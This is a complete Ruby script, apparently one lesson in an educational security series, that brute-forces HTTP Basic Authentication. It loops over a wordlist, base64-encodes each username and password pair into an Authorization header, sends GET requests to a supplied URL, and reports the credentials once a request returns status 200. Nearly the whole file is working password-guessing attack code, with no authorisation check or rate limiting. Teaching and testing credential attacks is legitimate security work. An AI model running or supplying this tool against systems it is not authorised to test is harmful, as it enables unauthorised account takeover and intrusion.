#!/usr/bin/env ruby
# frozen_string_literal: true

# 06_http_auth_bruteforce.rb — HTTP Basic Auth brute force
require "net/http"
require "uri"

# Educational script: tries passwords from a wordlist against an HTTP Basic Auth endpoint.
# Demonstrates Base64 encoding (via pack("m0") — pure stdlib, no base64 gem needed),
# custom Authorization headers, and Net::HTTP with SSL.

if ARGV.length != 3
  puts "Usage: ruby 06_http_auth_bruteforce.rb <url> <username> <wordlist>"
  exit 1
end

url = ARGV[0]
username = ARGV[1]
wordlist = ARGV[2]

puts "Brute forcing #{url} with user '#{username}'..."

File.open(wordlist, "r").each_line do |password|
  password = password.chomp
  next if password.empty?

  # Ruby 3.4+: base64 gem removed from stdlib. Use pack("m0") instead (always available).
  auth = ["#{username}:#{password}"].pack("m0")
  uri = URI(url)
  req = Net::HTTP::Get.new(uri)
  req["Authorization"] = "Basic #{auth}"

  res = Net::HTTP.start(uri.hostname, uri.port,
                        use_ssl: uri.scheme == "https") do |http|
    http.request(req)
  end

  if res.code.to_i == 200
    puts "[+] CREDENTIALS FOUND: #{username}:#{password}"
    exit 0
  else
    print "."
  end
end

puts "\n[-] No valid credentials found"
